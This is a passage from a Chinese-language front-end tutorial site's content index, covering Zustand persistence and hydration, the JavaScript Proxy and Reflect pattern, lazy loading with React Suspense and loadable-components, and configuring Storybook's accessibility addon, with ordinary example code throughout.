此方法能够更改中间件选项。请注意，新选项将与当前选项合并。\n例如，这可用于更改 storage 名称：\nuseStore.persist.setOptions({\rname: \u0026#34;new-name\u0026#34;\r}); 甚至更改 storage 引擎：\nuseStore.persist.setOptions({\rgetStorage: () =\u0026gt; sessionStorage,\r}); clearStorage   Schema: () =\u0026gt; void  这可用于完全清除 storage 中的持久值。\nuseStore.persist.clearStorage(); rehydrate 触发水合   Schema: () =\u0026gt; Promise\u0026lt;void\u0026gt;  在某些情况下，可能希望手动触发水合。可以通过调用该rehydrate方法来完成。\nawait useStore.persist.rehydrate(); hasHydrated 获取水合状态   Schema: () =\u0026gt; boolean  这是一个React的 getter，用于了解存储是否已被水合（请注意，在调用useStore.persist.rehydrate()时会更新）。\nuseStore.persist.hasHydrated(); onHydrate 水合过程开始   Schema: (listener: (state) =\u0026gt; void) =\u0026gt; () =\u0026gt; void  水合过程开始时将调用给定的侦听器。\n1 2 3 4 5 6 7  const unsub = useStore.persist.onHydrate((state) =\u0026gt; { console.log(\u0026#34;hydration starts\u0026#34;); }); // 稍后... unsub();   onFinishHydration 水合过程结束   Schema: (listener: (state) =\u0026gt; void) =\u0026gt; () =\u0026gt; void  当水化过程结束时，将调用给定的侦听器。\n1 2 3 4 5 6 7  const unsub = useStore.persist.onFinishHydration((state) =\u0026gt; { console.log(\u0026#34;hydration finished\u0026#34;); }); // 稍后... unsub();   4. 水合和异步存储 要解释异步存储的“成本”是什么，需要了解什么是水合作用（hydration）。\n1). 什么是水合hydration？ 简而言之，水合是从 storage 中检索持久状态并将其与当前状态合并的过程。\npersist 中间件执行两种 水合hydration：同步和异步。\n如果给定的存储是同步的（例如localStorage），水合将同步完成，如果给定的存储是异步的（例如AsyncStorage），水合将异步完成\u0026hellip;\u0026hellip;🥁。\n但问题是什么？ 在同步水合中，Zustand 在创建 store 时进行水合。在异步水合中，Zustand store 将在稍后的微任务中水合。\n为什么这有关系？ 异步水合可能会导致一些意外行为（成本所在）。例如，\n如果在 React 应用程序中使用 Zustand，store 将不会在初始渲染时水合。\n如果应用程序依赖于页面加载时的持久值，你可能希望等到 store 已被水合后再显示内容\n（例如，应用程序可能认为用户未登录，因为这是默认值，而实际上 store 还没有被水合）。\n2). 如何检查 store 是否已水合 有几种不同的方法可以做到这一点。\nfn1. 可以使用onRehydrateStorage选项来更新 store 中的字段：\nconst useStore = create(\rpersist(\r(set, get) =\u0026gt; ({\r// ...\r_hasHydrated: false\r}),\r{\r// ...\ronRehydrateStorage: () =\u0026gt; () =\u0026gt; {\ruseStore.setState({ _hasHydrated: true })\r}\r}\r)\r);\rexport default function App() {\rconst hasHydrated = useStore(state =\u0026gt; state._hasHydrated);\rif (!hasHydrated) {\rreturn \u0026lt;p\u0026gt;Loading...\u0026lt;/p\u0026gt;\r}\rreturn (\r// ...\r);\r} fn2. 还可以创建自定义useHydrationhook：\nconst useStore = create(persist(...))\rconst useHydration = () =\u0026gt; {\rconst [hydrated, setHydrated] = useState(useStore.persist.hasHydrated)\ruseEffect(() =\u0026gt; {\rconst unsubHydrate = useStore.persist.onHydrate(() =\u0026gt; setHydrated(false)) // Note: this is just in case you want to take into account manual rehydrations. You can remove this if you don\u0026#39;t need it/don\u0026#39;t want it.\rconst unsubFinishHydration = useStore.persist.onFinishHydration(() =\u0026gt; setHydrated(true))\rsetHydrated(useStore.persist.hasHydrated())\rreturn () =\u0026gt; {\runsubHydrate()\runsubFinishHydration()\r}\r}, [])\rreturn hydrated\r} 5. 如何使用自定义存储引擎？ 如果要使用的存储与预期的 API 不匹配，可以创建自己的存储：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  import create from \u0026#34;zustand\u0026#34; import { persist, StateStorage } from \u0026#34;zustand/middleware\u0026#34; import { get, set, del } from \u0026#39;idb-keyval\u0026#39; // 可以使用任何东西：IndexedDB、Ionic Storage 等  // 自定义 storage 对象 const storage: StateStorage = { getItem: async (name: string): Promise\u0026lt;string | null\u0026gt; =\u0026gt; { console.log(name, \u0026#34;has been retrieved\u0026#34;); return (await get(name)) || null }, setItem: async (name: string, value: string): Promise\u0026lt;void\u0026gt; =\u0026gt; { console.log(name, \u0026#34;with value\u0026#34;, value, \u0026#34;has been saved\u0026#34;); await set(name, value) }, removeItem: async (name: string): Promise\u0026lt;void\u0026gt; =\u0026gt; { console.log(name, \u0026#34;has been deleted\u0026#34;); await del(name) } } export const useStore = create(persist( (set, get) =\u0026gt; ({ fishes: 0, addAFish: () =\u0026gt; set({ fishes: get().fishes + 1 }) }), { name: \u0026#34;food-storage\u0026#34;, //唯一名称  getStorage: () =\u0026gt; storage, } ))   十三、像 Redux 一样编写代码 const types = { increase: \u0026#34;INCREASE\u0026#34;, decrease: \u0026#34;DECREASE\u0026#34; }\rconst reducer = (state, { type, by = 1 }) =\u0026gt; {\rswitch (type) {\rcase types.increase: return { grumpiness: state.grumpiness + by }\rcase types.decrease: return { grumpiness: state.grumpiness - by }\r}\r}\rconst useStore = create(set =\u0026gt; ({\rgrumpiness: 0,\rdispatch: args =\u0026gt; set(state =\u0026gt; reducer(state, args)),\r}))\rconst dispatch = useStore(state =\u0026gt; state.dispatch)\rdispatch({ type: types.increase, by: 2 }) 或者，只需使用redux-middleware。\n它连接你的main-reducer，设置初始 state，并向 state 本身和 vanilla api 添加一个dispatch函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  import React, { useEffect } from \u0026#39;react\u0026#39; import ReactDOM from \u0026#39;react-dom\u0026#39; import create from \u0026#39;zustand\u0026#39; import { devtools, redux } from \u0026#39;zustand/middleware\u0026#39; import \u0026#39;./styles.css\u0026#39; const initialState = { count: 0 } const types = { increase: \u0026#39;INCREASE\u0026#39;, decrease: \u0026#39;DECREASE\u0026#39; } const reducer = (state, { type, by }) =\u0026gt; { switch (type) { case types.increase: return { count: state.count + by } case types.decrease: return { count: state.count - by } default: return } } const [useStore, api] = create( // 将 store 连接到 devtools  // 如果没有 reducers 和 action-types，你会看到“setState”被注销  devtools( // 将我们的 store 转换为 redux action dispatcher ...  // 向 store 添加一个 dispatch 方法  redux(reducer, initialState) ) ) function Counter() { const count = useStore(state =\u0026gt; state.count) useEffect(() =\u0026gt; { // Increase  setTimeout(() =\u0026gt; api.dispatch({ type: types.increase, by: 3 }), 1000) // Decrease  setTimeout(() =\u0026gt; api.dispatch({ type: types.decrease, by: 1 }), 2000) // Decrease  setTimeout(() =\u0026gt; api.dispatch({ type: types.decrease, by: 1 }), 3000) }, []) return \u0026lt;span class=\u0026#34;header\u0026#34;\u0026gt;{count}\u0026lt;/span\u0026gt; } ReactDOM.render(\u0026lt;Counter /\u0026gt;, document.getElementById(\u0026#39;root\u0026#39;))   十四、在 React 事件处理程序之外调用 actions 如果在 React 事件处理程序之外调用setState，它会同步处理。\n在事件处理程序之外更新状态将强制 react 同步更新组件，因此增加了遇到僵尸子效应的风险。\n为了解决这个问题，需要将 actions 包裹在unstable_batchedUpdates中。\nimport { unstable_batchedUpdates } from \u0026#39;react-dom\u0026#39; // or \u0026#39;react-native\u0026#39;\rconst useStore = create((set) =\u0026gt; ({\rfishes: 0,\rincreaseFishes: () =\u0026gt; set((prev) =\u0026gt; ({ fishes: prev.fishes + 1 }))\r}))\rconst nonReactCallback = () =\u0026gt; {\runstable_batchedUpdates(() =\u0026gt; {\ruseStore.getState().increaseFishes()\r})\r} 十五、使用 Redux 开发工具 1 2 3 4 5 6 7 8 9  import { devtools } from \u0026#39;zustand/middleware\u0026#39; // 使用普通操作存储，它将记录操作为“setState” // devtools 将只记录来自每个单独存储的操作，这与典型的 redux 存储不同 const useStore = create(devtools(store)) // 使用 redux 存储，它将记录完整操作类型 const useStore = create(devtools(redux(reducer, initialState)))   Name store: devtools(store, {name: \u0026quot;MyStore\u0026quot;})，这将在 devtools 中创建一个名为“MyStore”的单独实例。\n序列化选项：devtools(store, { serialize: { options: true } })。\n十六、React context store create 不需要上下文提供程序（context providers）。\n在某些情况下，你可能希望使用上下文进行依赖注入，或者如果你想使用组件中的 props 初始化 store。\n因为 store 是一个钩子，把它作为一个普通的上下文值传递可能会违反钩子的规则。\n为了避免误用，提供了一个特殊createContext。\n1. 创建 createContext import create from \u0026#39;zustand\u0026#39;\rimport createContext from \u0026#39;zustand/context\u0026#39;\rconst { Provider, useStore } = createContext()\rconst createStore = () =\u0026gt; create(...)\rconst App = () =\u0026gt; (\r\u0026lt;Provider createStore={createStore}\u0026gt;\r...\r\u0026lt;/Provider\u0026gt;\r)\rconst Component = () =\u0026gt; {\rconst state = useStore()\rconst slice = useStore(selector)\r...\r} 2. 在组件中使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  import create from \u0026#34;zustand\u0026#34;; import createContext from \u0026#34;zustand/context\u0026#34;; // 最佳实践：可以将下面的 createContext() 和 createStore 移动到单独的文件 (store.js) 并导入提供程序Provider，在此处/任何需要的地方使用 store。  const { Provider, useStore } = createContext(); const createStore = () =\u0026gt; create((set) =\u0026gt; ({ bears: 0, increasePopulation: () =\u0026gt; set((state) =\u0026gt; ({ bears: state.bears + 1 })), removeAllBears: () =\u0026gt; set({ bears: 0 }) })); const Button = () =\u0026gt; { return ( {/** store() - 每次使用 Button 组件都创建一个 store，而不是为所有组件使用一个 store **/} \u0026lt;Provider createStore={createStore}\u0026gt; \u0026lt;ButtonChild /\u0026gt; \u0026lt;/Provider\u0026gt; ); }; const ButtonChild = () =\u0026gt; { const state = useStore(); return ( \u0026lt;div\u0026gt; {state.bears} \u0026lt;button onClick={() =\u0026gt; { state.increasePopulation(); }} \u0026gt; + \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; ); }; export default function App() { return ( \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;Button /\u0026gt; \u0026lt;Button /\u0026gt; \u0026lt;/div\u0026gt; ); }   3. createContext 使用 props 初始化（在 TS 中） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  import create from \u0026#34;zustand\u0026#34;; import createContext from \u0026#34;zustand/context\u0026#34;; type BearState = { bears: number increase: () =\u0026gt; void } // 将类型传递给 `createContext` 而不是 `create` const { Provider, useStore } = createContext\u0026lt;BearState\u0026gt;(); export default function App({ initialBears }: { initialBears: number }) { return ( \u0026lt;Provider createStore={() =\u0026gt; create((set) =\u0026gt; ({ bears: initialBears, increase: () =\u0026gt; set((state) =\u0026gt; ({ bears: state.bears + 1 })), })) } \u0026gt; \u0026lt;Button /\u0026gt; \u0026lt;/Provider\u0026gt; ) }   十七、TypeScript 类型定义 1. 类型定义 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  // 可以使用 `type` type BearState = { bears: number increase: (by: number) =\u0026gt; void } // 或者 `interface` interface BearState { bears: number increase: (by: number) =\u0026gt; void } // 它对两者都有效 const useStore = create\u0026lt;BearState\u0026gt;(set =\u0026gt; ({ bears: 0, increase: (by) =\u0026gt; set(state =\u0026gt; ({ bears: state.bears + by })), }))   2. 使用combine 并让 tsc 推断类型 这将两个状态浅合并。\nimport { combine } from \u0026#39;zustand/middleware\u0026#39;\rconst useStore = create(\rcombine(\r{ bears: 0 },\r(set) =\u0026gt; ({ increase: (by: number) =\u0026gt; set((state) =\u0026gt; ({ bears: state.bears + by })) })\r),\r) 十八、最佳实践（将store拆分为单独的slice）  目录结构\n  1.store/createBearSlice.js\n const createBearSlice = (set, get) =\u0026gt; ({\reatFish: () =\u0026gt; {\rset((prev) =\u0026gt; ({ fishes: prev.fishes \u0026gt; 1 ? prev.fishes - 1 : 0 }));\r}\r});\rexport default createBearSlice;  2.store/createFishSlice.js\n const maxFishes = 10;\rconst createFishSlice = (set, get) =\u0026gt; ({\rfishes: maxFishes,\rrepopulate: () =\u0026gt; {\rset((prev) =\u0026gt; ({ fishes: maxFishes }));\r}\r});\rexport default createFishSlice;  3.store/createHoneySlice.js\n const createHoneySlice = (set, get) =\u0026gt; ({\rhoneySlice: {\rhoney: 4\r}\r});\rexport default createHoneySlice;  4.store/useStore.js\n import create from \u0026#34;zustand\u0026#34;;\rimport createBearSlice from \u0026#34;./createBearSlice\u0026#34;;\rimport createFishSlice from \u0026#34;./createFishSlice\u0026#34;;\rimport createHoneySlice from \u0026#34;./createHoneySlice\u0026#34;;\rconst useStore = create((set, get) =\u0026gt; ({\r...createBearSlice(set, get),\r...createHoneySlice(set, get),\r...createFishSlice(set, get)\r}));\rexport default useStore;  5.pages/Mountain.js\n import useStore from \u0026#34;../store/useStore\u0026#34;;\rexport default function Mountain() {\rconst fishes = useStore((state) =\u0026gt; state.fishes);\rconst eatFish = useStore((state) =\u0026gt; state.eatFish);\rconst repopulate = useStore((state) =\u0026gt; state.repopulate);\rconst honey = useStore((state) =\u0026gt; state.honeySlice.honey);\rreturn (\r\u0026lt;div className=\u0026#34;Mountain\u0026#34;\u0026gt;\r\u0026lt;p\u0026gt;Fishes : {fishes}\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;honey : {honey}\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;button onClick={eatFish}\u0026gt;Eat\u0026lt;/button\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;button onClick={repopulate}\u0026gt;Repopulate\u0026lt;/button\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} ","description":"使用简化的通量原理的小型、快速且可扩展的React状态管理解决方案。有一个基于钩子的舒适 api。这是我感觉最好的React的状态管理库，很可爱。","id":65,"section":"react","tags":null,"title":"zustand","uri":"https://codthing.github.io/react/zustand/zustand-base/"},{"content":"使用 Proxy 对象，可以更好地控制与某些对象的交互。 每当与对象交互时，代理对象都可以确定行为，例如当我们获取一个值或设置一个值时。\n一般来说，代理是指别人的替身。 您将与联系的人的代理人交谈，而不是直接与该人交谈。 JavaScript 中也会发生同样的情况：我们将与 Proxy 对象交互，而不是直接与目标对象交互。\n\rProxy 代理 创建一个代表 John Doe 的 person 对象。\nconst person = {\rname: \u0026#34;John Doe\u0026#34;,\rage: 42,\rnationality: \u0026#34;American\u0026#34;\r}; 我们希望与代理对象进行交互，而不是直接与该对象交互。 在 JavaScript 中，可以通过创建一个新的 Proxy 实例来轻松地创建一个新的代理。\nconst person = {\rname: \u0026#34;John Doe\u0026#34;,\rage: 42,\rnationality: \u0026#34;American\u0026#34;\r};\rconst personProxy = new Proxy(person, {}); Proxy 的第一个参数是一个代表处理程序的对象。 在处理程序对象中，我们可以根据交互的类型定义特定的行为。 虽然有很多方法可以添加到代理处理程序中，但最常见的两个是 get 和 set：\n get：在尝试访问属性时被调用 set：在尝试修改属性时被调用  实际上，最终会发生以下情况：\n我们将与 personProxy 进行交互，而不是直接与 person 对象交互。\n让我们向 personProxy 代理添加处理程序。 当尝试修改一个属性，从而调用代理上的 set 方法时，我们希望代理记录该属性的先前值和新值。 当试图访问一个属性，从而调用代理上的 get 方法时，我们希望代理记录一个更易读的句子，其中包含该属性的任何值。\n1 2 3 4 5 6 7 8 9 10  const personProxy = new Proxy(person, { get: (obj, prop) =\u0026gt; { console.log(`${prop}的值是 ${obj[prop]}`); }, set: (obj, prop, value) =\u0026gt; { console.log(`将 ${prop}从 ${obj[prop]}更改为 ${value}`); obj[prop] = value; } });   Perfect! 让我们看看当我们尝试修改或检索属性时会发生什么。\n1 2 3  personProxy.name; //name 的值是 John Doe personProxy.age = 43; //年龄从 42 更改为 43   在访问 name 属性时，Proxy 返回了一个更好听的句子：name 的值是 John Doe。\n在修改 age 属性时，Proxy 返回了该属性的上一个值和新值：将年龄从 42 更改为 43。\n\r\r代理可用于添加验证。 用户不应该能够将人的年龄更改为字符串值，或者给他一个空的名字。 或者，如果用户试图访问对象上不存在的属性，我们应该让用户知道。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  const personProxy = new Proxy(person, { get: (obj, prop) =\u0026gt; { if (!obj[prop]) { console.log( `嗯..目标对象上似乎不存在此属性` ); } else { console.log(`${prop}的值是 ${obj[prop]}`); } }, set: (obj, prop, value) =\u0026gt; { if (prop === \u0026#34;age\u0026#34; \u0026amp;\u0026amp; typeof value !== \u0026#34;number\u0026#34;) { console.log(`抱歉，您只能传递年龄的数值。`); } else if (prop === \u0026#34;name\u0026#34; \u0026amp;\u0026amp; value.length \u0026lt; 2) { console.log(`您需要提供一个有效的 name。`); } else { console.log(`将 ${prop}从 ${obj[prop]}更改为 ${value}。`); obj[prop] = value; } } });   让我们看看当我们试图传递错误值时会发生什么！\n1 2 3 4  personProxy.nonExistentProperty; //嗯..这个属性似乎不存在 personProxy.age = \u0026#34;44\u0026#34;; //抱歉，您只能传递年龄的数值 personProxy.name = \u0026#34;\u0026#34;; //您需要提供一个有效的名称   Proxy 代理确保我们没有修改具有错误值的 person 对象，这有助于我们保持数据纯净！\n\rReflect 映射 JavaScript 提供了一个名为 的内置对象Reflect，它使我们在使用代理时更容易操作目标对象。\nReflect 是一个内置的对象，它提供拦截 JavaScript 操作的方法。\n这些方法与 proxy handlers 的方法相同。\nReflect 不是一个函数对象，因此它是不可构造的。\n在上面，我们尝试通过使用括号表示法直接获取或设置值来修改和访问代理内目标对象的属性。 现在，我们可以使用 Reflect 对象。 Reflect 对象上的方法与处理程序对象上的方法同名。\n可以通过 Reflect.get() 和 Reflect.set() 访问或修改目标对象上的属性，而不是通过 obj[prop] 访问属性或通过 obj[prop] = value 设置属性。 这些方法接收与处理程序（handlers）对象上的方法相同的参数。\n1 2 3 4 5 6 7 8 9 10  const personProxy = new Proxy(person, { get: (obj, prop) =\u0026gt; { console.log(`${prop}的值是 ${Reflect.get(obj, prop)}`); }, set: (obj, prop, value) =\u0026gt; { console.log(`将 ${prop}从 ${obj[prop]}更改为 ${value}`); Reflect.set(obj, prop, value); } });   Perfect! 我们可以使用 Reflect 对象轻松访问和修改目标对象的属性。\n1 2 3 4  personProxy.name; //name 的值是 John Doe personProxy.age = 43; //年龄从 42 更改为 43 personProxy.name = \u0026#34;Jane Doe\u0026#34;; //将名字从 John Doe 更改为 Jane Doe   \r优缺点 Proxy 是一种强大的方式来添加对对象行为的控制。 代理可以有各种用例：它可以帮助验证、格式化、通知或调试。\n过度使用 Proxy 对象或对每个处理程序方法调用执行繁重的操作很容易对应用程序的性能产生负面影响。\n最好不要对性能关键代码使用 Proxy。\n\r知识点  Proxy Reflect  ","description":"拦截和控制与目标对象的交互","id":66,"section":"react-patterns","tags":null,"title":"代理模式","uri":"https://codthing.github.io/react-patterns/design-patterns/proxy-patterns/"},{"content":"在聊天应用程序中，有四个主要部分：UserInfo，ChatList，ChatInput和EmojiPicker。\n但是，在初始页面加载时，只有三个组件会立即使用：UserInfo、ChatList和ChatInput。\nEmojiPicker不是直接可见的，用户甚至不会点击 EmojiPicker。\n这意味着不必将 EmojiPicker 模块添加到初始包中，否则可能会增加加载时间！\n为了解决这个问题，可以动态导入的 EmojiPicker 组件。\n\rReact Suspense 在 React 中动态导入组件的一种简单方法是使用 React Suspense。\nReact.Suspense 组件接收应动态加载的部件，这使得它可以使 App 组件可以通过暂停进口更快的渲染它的内容 EmojiPicker 模块！\n当用户单击表情符号时，EmojiPicker 组件将首次呈现。\nEmojiPicker 组件渲染一个 Suspense 组件，该组件接收延迟导入的模块：Suspense 组件接受一个 fallback prop，它接收应该在挂起的组件仍在加载时渲染的组件！\n而不是不必要地添加 EmojiPicker 到初始捆绑包，可以把它分成自己的包并减小初始包的大小！\n较小的初始包大小意味着更快的初始加载：\n用户不必长时间盯着空白的加载屏幕。\n该 fallback 组件让用户知道应用程序还没有冻结：他们只需要等待一段时间来处理和执行模块。\n1 2 3 4 5  Asset Size Chunks Chunk Names emoji-picker.bundle.js 1.48 KiB 1 [emitted] emoji-picker main.bundle.js 1.33 MiB main [emitted] main vendors~emoji-picker.bundle.js 171 KiB 2 [emitted] vendors~emoji-picker   之前的初始包是 1.5MiB，现在已经能够通过暂停 EmojiPicker 的导入将其减少到 1.33 MiB！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  // 之前的 components/ChatInput.js import React from \u0026#34;react\u0026#34;; import Send from \u0026#34;./icons/Send\u0026#34;; import Emoji from \u0026#34;./icons/Emoji\u0026#34;; import Picker from \u0026#34;./EmojiPicker\u0026#34;; const ChatInput = () =\u0026gt; { const [pickerOpen, togglePicker] = React.useReducer(state =\u0026gt; !state, false); return ( \u0026lt;div className=\u0026#34;chat-input-container\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type a message...\u0026#34; /\u0026gt; \u0026lt;Emoji onClick={togglePicker} /\u0026gt; {pickerOpen \u0026amp;\u0026amp; \u0026lt;Picker /\u0026gt;} \u0026lt;Send /\u0026gt; \u0026lt;/div\u0026gt; ); }; // 现在的 components/ChatInput.js import React, { Suspense, lazy } from \u0026#34;react\u0026#34;; // import Send from \u0026#34;./icons/Send\u0026#34;; // import Emoji from \u0026#34;./icons/Emoji\u0026#34;; const Send = lazy(() =\u0026gt; import(/*webpackChunkName: \u0026#34;send-icon\u0026#34; */ \u0026#34;./icons/Send\u0026#34;) ); const Emoji = lazy(() =\u0026gt; import(/*webpackChunkName: \u0026#34;emoji-icon\u0026#34; */ \u0026#34;./icons/Emoji\u0026#34;) ); // Lazy load EmojiPicker when \u0026lt;EmojiPicker /\u0026gt; renders const Picker = lazy(() =\u0026gt; import(/*webpackChunkName: \u0026#34;emoji-picker\u0026#34; */ \u0026#34;./EmojiPicker\u0026#34;) ); const ChatInput = () =\u0026gt; { const [pickerOpen, togglePicker] = React.useReducer(state =\u0026gt; !state, false); return ( \u0026lt;Suspense fallback={\u0026lt;p id=\u0026#34;loading\u0026#34;\u0026gt;Loading...\u0026lt;/p\u0026gt;}\u0026gt; \u0026lt;div className=\u0026#34;chat-input-container\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type a message...\u0026#34; /\u0026gt; \u0026lt;Emoji onClick={togglePicker} /\u0026gt; {pickerOpen \u0026amp;\u0026amp; \u0026lt;Picker /\u0026gt;} \u0026lt;Send /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/Suspense\u0026gt; ); };   在构建应用程序时，可以看到 Webpack 创建的不同包。\n通过动态导入 EmojiPicker 组件，设法将初始包大小从 1.5MiB 减少到 1.33 MiB！\n尽管用户可能仍然需要等待一段时间才能完全加载 EmojiPicker，但通过确保在用户等待组件加载时呈现应用程序和交互来改善用户体验。\n\rloadable-components ✔ 服务器端渲染不支持 React Suspense（目前）。\nReact Suspense 的一个很好的替代品是 loadable-components 库，它可以在 SSR 应用程序中使用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  // components/ChatInput.js import React from \u0026#34;react\u0026#34;; import loadable from \u0026#34;@loadable/component\u0026#34;; import Send from \u0026#34;./icons/Send\u0026#34;; import Emoji from \u0026#34;./icons/Emoji\u0026#34;; const EmojiPicker = loadable(() =\u0026gt; import(\u0026#34;./EmojiPicker\u0026#34;), { fallback: \u0026lt;div id=\u0026#34;loading\u0026#34;\u0026gt;Loading...\u0026lt;/div\u0026gt; }); const ChatInput = () =\u0026gt; { const [pickerOpen, togglePicker] = React.useReducer(state =\u0026gt; !state, false); return ( \u0026lt;div className=\u0026#34;chat-input-container\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type a message...\u0026#34; /\u0026gt; \u0026lt;Emoji onClick={togglePicker} /\u0026gt; {pickerOpen \u0026amp;\u0026amp; \u0026lt;EmojiPicker /\u0026gt;} \u0026lt;Send /\u0026gt; \u0026lt;/div\u0026gt; ); }; export default ChatInput;   与 React Suspense 类似，\n可以将延迟导入的模块传递给 loadable，它只会在请求 EmojiPicker 模块时才导入该模块！\n在加载模块时，可以渲染回退组件。\n尽管可加载组件是用于 SSR 应用程序的 React Suspense 的绝佳替代品，它在 CSR 应用程序中也很有用，用以暂停模块的导入。\n\r知识点   React.Suspense\n  fallback prop\n  loadable-components\n  ","description":"按需导入部分代码","id":67,"section":"react-patterns","tags":null,"title":"动态导入","uri":"https://codthing.github.io/react-patterns/performance-patterns/dynamic-import/"},{"content":"可访问性是使网站包容所有人的做法。\n这意味着支持例如：键盘导航、屏幕阅读器支持、触摸友好、可用的颜色对比度、减少运动和缩放支持。\n可访问性测试根据一组基于 WCAG 规则和其他行业公认的最佳实践的启发式方法来审核呈现的 DOM。 它们充当 QA 的第一道防线，以发现明显的可访问性违规行为。\nStorybook 的官方 a11y 插件 会在开发组件时运行可访问性审核，以便提供快速反馈循环。 它由 Deque 的 axe-core 提供支持，可自动捕获多达 57% 的 WCAG 问题。\n\r设置 a11y 插件 要使用 Storybook 可访问性测试，需要安装 @storybook/addon-a11y 插件。 运行以下命令：\n1 2  yarn add --dev @storybook/addon-a11y   更新 Storybook 配置（在 .storybook/main.js 中）以包含可访问性插件：\n1 2 3 4 5 6 7 8 9 10 11  // .storybook/main.js  module.exports = { stories:[], addons:[ \u0026#39;@storybook/addon-links\u0026#39;, \u0026#39;@storybook/addon-essentials\u0026#39;, \u0026#39;@storybook/preset-create-react-app\u0026#39;, \u0026#39;@storybook/addon-a11y\u0026#39;, //👈 The a11y addon goes here };   启动 Storybook，在 UI 中看到一些明显的差异。 一个新的工具栏图标和可访问性面板，可以在其中检查测试结果。\n\r它如何工作？ Storybook 的 a11y 插件在选定的故事上运行 Ax。 允许开发过程中发现和修复可访问性问题。\n例如，如果正在处理按钮组件并包含以下故事集：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  // Button.stories.ts|tsx  import React from \u0026#39;react\u0026#39;; import { ComponentStory, ComponentMeta } from \u0026#39;@storybook/react\u0026#39;; import { Button } from \u0026#39;./Button\u0026#39;; export default { title: \u0026#39;Accessibility testing\u0026#39;, component: Button, argTypes: { backgroundColor: { control: \u0026#39;color\u0026#39; }, }, } as ComponentMeta\u0026lt;typeof Button\u0026gt;; const Template: ComponentStory\u0026lt;typeof Button\u0026gt; = (args) =\u0026gt; \u0026lt;Button {...args} /\u0026gt;; // This is an accessible story export const Accessible = Template.bind({}); Accessible.args = { primary: false, label: \u0026#39;Button\u0026#39;, }; // This is not export const Inaccessible = Template.bind({}); Inaccessible.args = { ...Accessible.args, backgroundColor: \u0026#39;red\u0026#39;, };   反复浏览这两个故事，会看到无法访问的故事包含一些需要修复的问题。\n在可访问性面板中打开违规选项卡可以清楚地描述可访问性问题以及解决该问题的指南。\n\r配置 开箱即用，Storybook 的可访问性插件包括一组涵盖大多数问题的可访问性规则。\n还可以微调插件配置或覆盖 Axe 的规则集以最适合需求。\n全局配置 a11y 如果需要在所有故事中取消可访问性规则或修改其设置，可以将以下内容添加到 storybook/preview.js：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  // .storybook/preview.js  export const parameters = { a11y: { // 要检查的可选选择器  element: \u0026#39;#root\u0026#39;, config: { rules: [ { // 自动完成规则将不会根据提供的 CSS 选择器运行  id: \u0026#39;autocomplete-valid\u0026#39;, selector: \u0026#39;*:not([autocomplete=\u0026#34;nope\u0026#34;])\u0026#39;, }, { // 将 enabled 选项设置为 false 将禁用对所有故事的此特定规则的检查。  id: \u0026#39;image-alt\u0026#39;, enabled: false, }, ], }, // Axe 的选项参数  options: {}, // 防止自动检查的可选标志  manual: true, }, };   组件级 a11y 配置 还可以为组件的所有故事自定义自己的规则集。 更新故事的默认导出并添加具有所需配置的参数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  // MyComponent.stories.js|jsx|ts|tsx  import { MyComponent } from \u0026#39;./MyComponent\u0026#39;; export default { title: \u0026#39;Configure a11y addon\u0026#39;, component: MyComponent, parameters: { a11y: { // 要检查的可选选择器  element: \u0026#39;#root\u0026#39;, config: { rules: [ { // 自动完成规则将不会根据提供的 CSS 选择器运行  id: \u0026#39;autocomplete-valid\u0026#39;, selector: \u0026#39;*:not([autocomplete=\u0026#34;nope\u0026#34;])\u0026#39;, }, { // 将 enabled 选项设置为 false 将禁用对所有故事的此特定规则的检查。  id: \u0026#39;image-alt\u0026#39;, enabled: false, }, ], }, options: {}, manual: true, }, }, };   故事级 a11y 配置 通过更新故事以包含新参数，自定义故事级别的 a11y 规则集：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  // MyComponent.stories.ts|tsx  import React from \u0026#39;react\u0026#39;; import { ComponentStory, ComponentMeta } from \u0026#39;@storybook/react\u0026#39;; import { MyComponent } from \u0026#39;./MyComponent\u0026#39;; export default { title: \u0026#39;Configure a11y addon\u0026#39;, component: MyComponent, } as ComponentMeta\u0026lt;typeof MyComponent\u0026gt;; const Template: ComponentStory\u0026lt;typeof MyComponent\u0026gt; = () =\u0026gt; \u0026lt;MyComponent /\u0026gt;; export const ExampleStory = Template.bind({}); ExampleStory.parameters = { a11y: { element: \u0026#39;#root\u0026#39;, config: { rules: [ { // 自动完成规则将不会根据提供的 CSS 